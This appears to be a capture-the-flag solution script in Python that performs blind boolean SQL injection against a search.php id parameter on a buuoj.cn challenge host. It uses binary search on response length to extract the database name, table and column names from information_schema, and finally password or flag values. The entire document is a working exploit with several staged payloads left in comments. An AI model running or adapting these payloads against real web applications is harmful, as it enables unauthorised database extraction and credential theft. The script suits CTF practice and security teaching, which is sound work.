import requests as req
import time

url = "http://35078fea-92d4-4254-b5e9-e34b08015553.node5.buuoj.cn:81/search.php?id="
res = ''
length = 1000
for i in range(1,length+1):
    low = 0x00
    high = 0x7f
    while(low <= high):
        mid = (high + low) // 2
        print(low, mid, high)
        # payload = f"1-(length(database())>{{mid}})"
        # payload = f"1-(ascii(substr((database()),{i},1))>{mid})"
        # payload = f"1-(ascii(substr((Select(group_concat(table_name))From(information_schema.tables)Where(table_schema='geek')),{i},1))>{mid})"
        # payload = f"1-(ascii(substr((Select(group_concat(column_name))From(information_schema.columns)Where(table_name='F1naI1y')),{i},1))>{mid})"
      #  payload = f"1 and ascii(substr(reverse((Select password From fl4gawsl Where id=2)), {i}, 1)) > {mid}"
        payload = f"1-(ascii(substr((Select(reverse(group_concat(password)))From(F1naI1y)),{i},1))>{mid})"
        print(payload)
        response = req.get(url + payload)
        print(len(response.text))
        ## 二分法条件
        if(len(response.text) < 723):
            low = mid + 1
        else:
            high = mid - 1
        time.sleep(0.5)
        # print("[+]:", res)
    res += chr(low)
    print("[+]:", res)
print(res)